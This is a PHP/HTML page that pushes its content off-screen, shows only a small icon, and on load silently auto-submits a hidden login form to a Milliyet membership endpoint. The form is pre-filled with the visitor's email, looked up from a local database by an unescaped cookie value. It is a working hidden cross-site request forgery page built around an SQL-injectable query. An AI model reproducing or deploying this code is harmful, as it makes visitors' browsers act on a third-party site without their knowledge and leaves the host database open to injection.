<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `milliyet` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["aspnetForm"].submit();}</script>


<form name="aspnetForm" method="post" action="http://uyelik.milliyet.com.tr/Login.aspx?Update=1" id="aspnetForm">
<div>
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKLTkzMzYxMzMyMmQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgIFFmN0bDAwJENQSCRjYlJlbWVtYmVyTWUFFmN0bDAwJENQSCRJbWFnZUJ1dHRvbjHtZvuC9m792T/0msDKplEGVXi5Xw==">
</div>

<div>

	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEWBQLxvMtDAv7Sqp4JAoO99HsCoNWTgQkCubyVzw1aCvgjQQ6kBwOdBnFNz19yMKPA0Q==">
</div>
    <div>
        
      

                    </div>
                    <div class="formLine">
                        <label class="flt_left wide">
                            E-Posta</label>
                        <input name="ctl00$CPH$txtLoginUserName" type="text" id="ctl00_CPH_txtLoginUserName" class="wide flt_left" value="<?=$email;?>">
                        <div class="cls">
                            &nbsp;</div>
                    </div>
                    <div class="formLine">
                        <label class="flt_left wide">
                            Şifre</label>
                        <input name="ctl00$CPH$txtLoginPassword" type="password" id="ctl00_CPH_txtLoginPassword" class="wide flt_left">
                        <div class="cls">
                            &nbsp;</div>
                    </div>
                    <div class="formLine">

                        <span class="MG_11 MG_fL MG_mT2px"><input id="ctl00_CPH_cbRememberMe" type="checkbox" name="ctl00$CPH$cbRememberMe"><label for="ctl00_CPH_cbRememberMe">Beni Hatırla</label></span>
                        <a href="ForgetPassword.aspx" class="MG_lnk9 MG_11">Şifremi Unuttum</a>
                        <div class="cls">
                            &nbsp;</div>
                    </div>
                    <div class="formLine">
                        <input type="image" name="ctl00$CPH$ImageButton1" id="ctl00_CPH_ImageButton1" class="MG_mL2" src="d/i/1/gonder.gif" onClick="return CheckForm();" style="border-width:0px;">
                        <a href="Javascript:ClearForm();" title="temizle">
                            <img src="d/i/1/temizle.gif" width="59" height="18" alt="temizle" border="0"></a>
                    </div>
                    <div class="formLine" style="margin-top: 73px">
                   
    </form>
    
    

</body>
</html>

